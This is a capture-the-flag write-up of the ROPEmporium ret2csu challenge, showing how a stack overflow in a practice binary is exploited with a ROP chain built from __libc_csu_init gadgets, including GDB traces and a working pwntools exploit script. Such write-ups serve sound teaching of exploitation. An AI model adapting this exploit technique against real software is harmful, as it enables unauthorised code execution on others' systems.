---
title: "ROPEmporium: Ret2CSU Write-up"
date: 2023-02-21
description: "My write-up for the Ret2CSU challenge from ROPEmporium"
summary: "My write-up for the Ret2CSU challenge from ROPEmporium"
tags: ["rop", "pwn", "ropemporium"]
---


In this post, I will be explaining my solution for the Ret2CSU challenge from
ROPEmporium. The challenge can be found here:
https://ropemporium.com/challenge/ret2csu.html

ROPEmporium challenges are awesome for learning Return Oriented Programming (ROP) with small and fairly easy-to-analyse binaries. Ret2CSU is the 8th and (currently) final stage of ROPEmporium and involves a binary with no custom ROP gadgets added to it. You have to work with the "attached code" added to the binary by the compiler, and your goal is to execute the ret2win function.

Here are some tools I recommend for these types of binary challenges:

 - GDB with the PEDA extension (for debugging)
 - objdump (for dissassembling and finding symbol addresses)
 - readelf (for looking at the ELF header and symbols)
 - pwntools python library (for creating exploits)
 - ROPgadget (for finding ROP gadgets available in the binary)

In the challenge, we are provided a flag.txt file and the executable to
compromise (named ret2csu). Let's run file  on it to make sure it's what we
expect:

```bash
$ file ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a799b370a24ba0109f1175f31b3058094b5feab5, not stripped
```

OK cool! So it's a 64 bit ELF executable with dynamically linked libraries. The
symbols also haven't been stripped, which is nice :)

Next we can execute it in a sandbox environment and see what happens:

```bash
$ ./ret2csu
ret2csu by ROP Emporium

Call ret2win()The third argument (rdx) must be 0xdeadcafebabebeef
```

The executable just prints out some text and asks us to call `ret2win`, making
sure the third argument to it (which is in `rdx`) is equal to `0xdeadcafebabebeef`.

Note that there's a great reference for 64-bit syscalls here:
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/. This site shows that parameters to parsed in using the following registers: RDI, then RSI, then RDX.

Let's also run `checksec` on the binary (provided with GDB PEDA) to see what
protections it has:

```bash
$ gdb ret2csu -q
Reading symbols from ret2csu...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY - : disabled
FORTIFY   : disabled
NX -  - : ENABLED
PIE -    : disabled
RELRO -  : Partial
```

Above we can see that NX is enabled (hence we have to use ROP), CANARY is
disabled (so we don't have to bypass a stack canary), and PIE is disabled (so we
know the addresses of the binary itself are predictable). Next, as we know this
is a buffer overflow challenge, we can run the binary with GDB and provide a
large value as the input to see what happens:

```bash
$ gdb ret2csu -q
Reading symbols from ret2csu...(no debugging symbols found)...done.
gdb-peda$ pattern create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
gdb-peda$ r
Starting program: /root/Documents/hackthebox/ropemporium/ret2csu/ret2csuret2csu by ROP Emporium

Call ret2win()
The third argument (rdx) must be 0xdeadcafebabebeef

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
```

I created a unique pattern with `pattern create` and then sent it to the program.
The program crashes straight away and GDB PEDA shows me the following output:

```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x601038 --> 0x0
RBX: 0x0
RCX: 0xfbad2288
RDX: 0x7fffffffe0d0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
RSI: 0x7ffff7f998d0 --> 0x0
RDI: 0x0
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe0f8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
RIP: 0x4007b0 (<pwnme+156>:	ret)
R8 : 0x0
R9 : 0x7ffff7f9e500 (0x00007ffff7f9e500)
R10: 0x602010 --> 0x0
R11: 0x246R12: 0x4005f0 (<_start>:	xor - ebp,ebp)
R13: 0x7fffffffe1e0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x4007a7 <pwnme+147>:	mov - rdi,0x0
0x4007ae <pwnme+154>:	nop
0x4007af <pwnme+155>:	leave
=> 0x4007b0 <pwnme+156>:	ret
0x4007b1 <ret2win>:	push   rbp
0x4007b2 <ret2win+1>:	mov - rbp,rsp
0x4007b5 <ret2win+4>:	sub - rsp,0x30
0x4007b9 <ret2win+8>:	mov - DWORD PTR [rbp-0x24],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe0f8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0008| 0x7fffffffe100 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0016| 0x7fffffffe108 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0024| 0x7fffffffe110 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0032| 0x7fffffffe118 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0040| 0x7fffffffe120 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0048| 0x7fffffffe128 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
0056| 0x7fffffffe130 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004007b0 in pwnme ()
```

The crash is when the program is trying to run `ret`, which pops the first 64 bits
off the stack and jumps to that location. As the top of the stack is pointing to
our unique pattern, the program is unable to jump to it as a location and
crashes with a segfault. So let's find the offset of the top of the stack:

```bash
gdb-peda$ pattern offset AA0AAFAAbAA
AA0AAFAAbAA found at offset: 40
```

Great! Now we can create a sample python exploit and test whether we can control
the flow of the application at this offset. Below, I use `pwntools` to create a
template for my exploit code:

```bash
$ pwn template ret2csu > exploit.py
```

The above line creates an executable python script with some nice template code,
with features such as:

 - creating a `pwntools` process object to allow us to interact with the process
 - parsing arguments to enable or disable remote GDB debugging
 - automatically executes checksec  on the binary and puts it in a comment in
 - our exploit

Now to get to our actual ROP chain! Let's find the addresses of the symbols and
gadgets we need! First, we need the address of the ret2win function. We can use `objdump` to help us with this:

```bash
$ objdump -D ret2csu -M intel | grep ret2win
00000000004007b1 < ret2win>:
```

Note that I disassembled all sections in the binary using `-D` and asked for the
output to be in intel syntax using `-M intel`. Next, we can use `ROPgadget` to find
gadgets. We know that we want to control the value in RDX, so we can look for
any instructions with `pop` or `rdx` in them:

```bash
$ ROPgadget --binary ret2csu | grep pop
<---------snipped output--------->
0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
$ ROPgadget --binary ret2csu | grep rdx
0x0000000000400567 : lea ecx, dword ptr [rdx] ; and byte ptr [rax], al ; test rax, rax ; je 0x40057b ; call rax
0x000000000040056d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
```

We have a really nice gadget for controlling the registers `R12,R13,R14,R15`,
however we don't have any nice gadgets for controlling what goes into `rdx`.

Using `objdump -D ret2csu -M intel` we find that the above `pop` gadget is
actually in the `<__libc_csu_init>` section of the codebase, and has a few more
pop instructions before it:

```
40089a:	5b -  -  -  -    	pop - rbx
40089b:	5d -  -  -  -    	pop - rbp
40089c:	41 5c -  -  -  - 	pop - r12
40089e:	41 5d -  -  -  - 	pop - r13
4008a0:	41 5e -  -  -  - 	pop - r14
4008a2:	41 5f -  -  -  - 	pop - r15
4008a4:	c3 -  -  -  -    	ret
```

This must be the section the challenge title is referring to! So we look for
other code in this section which we may be able to use to control RDX, and we
find the following interesting code:

```
400880:	4c 89 fa -  -  -  	mov - rdx,r15
400883:	4c 89 f6 -  -  -  	mov - rsi,r14
400886:	44 89 ef -  -  -  	mov - edi,r13d
400889:	41 ff 14 dc -  -   	call   QWORD PTR [r12+rbx*8]
```

The above gadget, also found in the CSU section, uses the registers we control (`r12,r13,r14,r15`) in `mov` instructions and a `call` instruction. This is great!
We can treat the call like a jmp instruction as long as we control the contents
of `r12` and `rbx`, where the address jumped to is calculated as follows:

 - ptr(r12 + rbx * 8)

As part of the first `mov` instruction, we see that the value in `r15` is copied
into `rdx`. This means we can use our first gadget to pop a value of our choice
into `r15` and then use the second gadget to copy this value into rdx!

OK we're getting somewhere. Let's set up our initial payload to set RDX  to the
value we want and set all other registers to `0x00`:

```python
io = start()

# mov r15 -> rdx, mov r14 -> rsi, mov r13d -> edi, call ptr(r12 + rbx*8)
movAndCall = p64(0x400880)

# pop in the following order: rbx, rbp, r12, r13, r14, r15
popAllRegisters = p64(0x40089a)
ret2win = p64(0x04007b1)
valueForRdx = p64(0xdeadcafebabebeef)

initial = "A"*40
payload = initial + popAllRegisters + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + valueForRdx + movAndCall

io.send(payload)
open('output','w').write(payload)

io.interactive()
```

As we have set `r12` and `rbx` to `0x00`, we expect the program to crash when it
tries to execute `call [0x00]`. To help test my payload, I've also added the
second last line to output my payload to a file. I can then easily pass my
payload to the application from within GDB. After running `./exploit.py`, I have a
file named output in my folder, and I run the application in GDB as follows:

```bash
$ gdb ret2csu -q
Reading symbols from ret2csu...(no debugging symbols found)...done.
gdb-peda$ r < output
Starting program: ret2csu < output
ret2csu by ROP Emporium
Call ret2win()
The third argument (rdx) must be 0xdeadcafebabebeef

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x601038 --> 0x0
RBX: 0x0RCX: 0xfbad2098
RDX: 0xdeadcafebabebeef
RSI: 0x0RDI: 0x0
RBP: 0x0
RSP: 0x7fffffffe138 --> 0x5d2334019ad6ff00
RIP: 0x400889 (<__libc_csu_init+73>:	call   QWORD PTR [r12+rbx8])
R8 : 0x0
R9 : 0x77 ('w')
R10: 0x602010 --> 0x0
R11: 0x246
R12: 0x0
R13: 0x0
R14: 0x0
R15: 0xdeadcafebabebeef
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x400880 <__libc_csu_init+64>:	mov - rdx,r15
0x400883 <__libc_csu_init+67>:	mov - rsi,r14
0x400886 <__libc_csu_init+70>:	mov - edi,r13d
=> 0x400889 <__libc_csu_init+73>:	call   QWORD PTR [r12+rbx8]
0x40088d <__libc_csu_init+77>:	add - rbx,0x1
0x400891 <__libc_csu_init+81>:	cmp - rbp,rbx
0x400894 <__libc_csu_init+84>:	jne - 0x400880 <__libc_csu_init+64>
0x400896 <__libc_csu_init+86>:	add - rsp,0x8
Guessed arguments:
arg[0]: 0x0
arg[1]: 0x0
arg[2]: 0xdeadcafebabebeef
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe138 --> 0x5d2334019ad6ff00
0008| 0x7fffffffe140 --> 0x4005f0 (<_start>:	xor - ebp,ebp)
0016| 0x7fffffffe148 --> 0x7fffffffe1e0 --> 0x1
0024| 0x7fffffffe150 --> 0x0
0032| 0x7fffffffe158 --> 0x0
0040| 0x7fffffffe160 --> 0xa2dccb7e4876ffdc
0048| 0x7fffffffe168 --> 0xa2dcdb418af0ffdc
0056| 0x7fffffffe170 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400889 in __libc_csu_init ()
```

OK great! We have a successful crash as predicted at `0x400889`! We can also see
that the values of our registers `r12` and `rbx` are set to `0x0`.

Here is the tricky bit of this challenge. I mistakenly tried putting the
address of `ret2win` in `r12` and keeping `0x0` in `rbx`, assuming that the `call` would
jump to `ret2win`, but this was an incorrect assumption as the `call` instruction
actually dereferences the calculated value first and then jumps to what it
points to.

Being stuck here for a bit, I thought about placing the address of `ret2win` on
the stack and the address of the stack in `r12`, which should dereference
correctly, but didn't find any useful gadget for doing this. The alternative is
to find a location in the binary which points to another location in the
codebase, and continue execution from there.

Disassembling all sections again and looking through for pointers to code (which
I know has addresses after `0x400000`), I find some interesting parts added by
the compiler again:

```
Disassembly of section .init_array:

0000000000600e10 <__frame_dummy_init_array_entry>:
600e10:	d0 06 -  -  -  - 	rol - BYTE PTR [rsi],1
600e12:	40 00 00 -  -  -  	add - BYTE PTR [rax],al
600e15:	00 00 -  -  -  - 	add - BYTE PTR [rax],al
...

Disassembly of section .fini_array:

0000000000600e18 <__do_global_dtors_aux_fini_array_entry>:
600e18:	a0 -  -  -  -    	.byte 0xa0
600e19:	06 -  -  -  -    	(bad)
600e1a:	40 00 00 -  -  -  	add - BYTE PTR [rax],al
600e1d:	00 00 -  -  -  - 	add - BYTE PTR [rax],al
```

Looks like at `0x600e10` I have the address `0x4006d0` and at `0x600e18` I have the address `0x4006a0`. So if I set `r12` to either of these pointers, I should be able get to these addresses. Let's have a look at the code at these addresses:

```
00000000004006a0 <__do_global_dtors_aux>:
4006a0:	80 3d d1 09 20 00 00 	cmp - BYTE PTR [rip+0x2009d1],0x0 -  - # 601078 <completed.7696>
4006a7:	75 17 -  -  -  - 	jne - 4006c0 <__do_global_dtors_aux+0x20>
4006a9:	55 -  -  -  -    	push   rbp4006aa:	48 89 e5 -  -  -  	mov - rbp,rsp
4006ad:	e8 7e ff ff ff -    	call   400630 <deregister_tm_clones>
4006b2:	c6 05 bf 09 20 00 01 	mov - BYTE PTR [rip+0x2009bf],0x1 -  - # 601078 <completed.7696>
4006b9:	5d -  -  -  -    	pop - rbp
4006ba:	c3 -  -  -  -    	ret
4006bb:	0f 1f 44 00 00 -    	nop - DWORD PTR [rax+rax1+0x0]
4006c0:	f3 c3 -  -  -  - 	repz ret
4006c2:	0f 1f 40 00 -  -   	nop - DWORD PTR [rax+0x0]
4006c6:	66 2e 0f 1f 84 00 00 	nop - WORD PTR cs:[rax+rax1+0x0]
4006cd:	00 00 00

00000000004006d0 <frame_dummy>:
4006d0:	55 -  -  -  -    	push   rbp
4006d1:	48 89 e5 -  -  -  	mov - rbp,rsp
4006d4:	5d -  -  -  -    	pop - rbp
4006d5:	eb 89 -  -  -  - 	jmp - 400660 <register_tm_clones>
```

They are more functions placed into the binary by the compiler! So, if we take
them as functions in their own right, we may be able to assume that they end in
a `ret` which should return us back into `<__libc_csu_init>` right after our call.
The `call` instruction will automatically put the next instruction onto the
stack, so if any of these functions ends in a `ret`, we will continue execution
within `<__libc_csu_init>`.

So as long as this works, the following code should be executed after our call:

```
400889:	41 ff 14 dc -  -   	call   QWORD PTR [r12+rbx*8]
40088d:	48 83 c3 01 -  -   	add - rbx,0x1
400891:	48 39 dd -  -  -  	cmp - rbp,rbx
400894:	75 ea -  -  -  - 	jne - 400880 <__libc_csu_init+0x40>
400896:	48 83 c4 08 -  -   	add - rsp,0x8
40089a:	5b -  -  -  -    	pop - rbx
40089b:	5d -  -  -  -    	pop - rbp
40089c:	41 5c -  -  -  - 	pop - r12
40089e:	41 5d -  -  -  - 	pop - r13
4008a0:	41 5e -  -  -  - 	pop - r14
4008a2:	41 5f -  -  -  - 	pop - r15
4008a4:	c3 -  -  -  -    	ret
```

It looks like after our call, we execute a compare instruction, and then as long
as that sets the zero flag, we continue execution to our first gadget. This is
very convenient that we get back to our first gadget because it ends with a `ret`,
allowing us to finally pass control to `ret2win` after having set `RDX` to the
value we wanted.

Now all we need to do is make sure the `cmp` instruction compares two equal
values. It looks like `0x01` is added to `rbx` and then compared to `rbp`. Since we
control both these registers from our first gadget, we can just set these to `0x00` and `0x01` respectively and continue execution past the `jne` instruction.

So our final payload becomes:

```python
io = start()

# mov r15 -> rdx, mov r14 -> rsi, mov r13d -> edi, call ptr(r12 + rbx*8)
movAndCall = p64(0x400880)

# pop in the following order: rbx, rbp, r12, r13, r14, r15
popAllRegisters = p64(0x40089a)
ret2win = p64(0x04007b1)
valueForRdx = p64(0xdeadcafebabebeef)
valueForR12 = p64(0x600e18)

initial = "A"*40
payload = initial + popAllRegisters + p64(0) + p64(1) + valueForR12 + p64(0) + p64(0) + valueForRdx + movAndCall
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + ret2win

io.send(payload)
open('output','w').write(payload)

io.interactive()
```

Our payload includes the initial 40 bytes of junk, followed by the `call` to our
first gadget for popping 6 registers. We set `rbx` to `0x00`, `rbp`  to `0x01`, `r12` to
one of the pointers we found, `r13` and `r14` to whatever, and `r15` to the special
challenge value. Then the second gadget gets called (`movandCall`), and we
continue execution past the `call` to `add rsp, 0x08` followed by 6 `pop`'s and a `ret`. So we place 7 64-bit values on the stack and `ret` to our `ret2win` address :)

```bash
$ ./exploit.py
[] 'ret2csu'
Arch: -  amd64-64-little
RELRO: - Partial RELRO
Stack: - No canary found
NX: -    NX enabled
PIE: -   No PIE (0x400000)
[+] Starting local process 'ret2csu': pid 10496
[] Switching to interactive mode
$
ROPE{a_placeholder_32byte_flag!}
```

And that's our flag!

Many thanks to the challenge creator for helping me learn!
